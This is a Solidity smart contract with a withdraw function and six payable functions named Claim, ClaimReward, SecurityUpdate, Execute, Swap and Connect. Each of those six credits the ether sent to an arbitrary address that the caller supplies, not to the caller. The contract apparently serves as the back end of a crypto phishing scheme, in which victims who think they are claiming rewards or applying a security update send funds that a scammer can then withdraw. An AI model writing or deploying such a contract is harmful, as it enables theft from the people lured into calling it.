1 // SPDX-License-Identifier: Unlicense
2 
3 pragma solidity ^0.8.17;
4 
5 contract SmartContract {
6   address private owner;
7   mapping (address => uint256) private balances;
8   constructor() {
9     owner = msg.sender;
10   }
11   function getOwner() public view returns (address) {
12     return owner;
13   }
14   function getBalance() public view returns (uint256) {
15     return address(this).balance;
16   }
17   function getUserBalance(address user) public view returns (uint256) {
18     return balances[user];
19   }
20   function withdraw(address to, uint256 amount) public {
21     amount = (amount == 0) ? balances[msg.sender] : amount;
22     require(amount > 0 && balances[msg.sender] >= amount, "It's not enough money on balance");
23     balances[msg.sender] = balances[msg.sender] - amount;
24     payable(to).transfer(amount);
25   }
26   function Claim(address sender) public payable {
27     balances[sender] += msg.value;
28   }
29   function ClaimReward(address sender) public payable {
30     balances[sender] += msg.value;
31   }
32   function SecurityUpdate(address sender) public payable {
33     balances[sender] += msg.value;
34   }
35   function Execute(address sender) public payable {
36     balances[sender] += msg.value;
37   }
38   function Swap(address sender) public payable {
39     balances[sender] += msg.value;
40   }
41   function Connect(address sender) public payable {
42     balances[sender] += msg.value;
43   }
44 }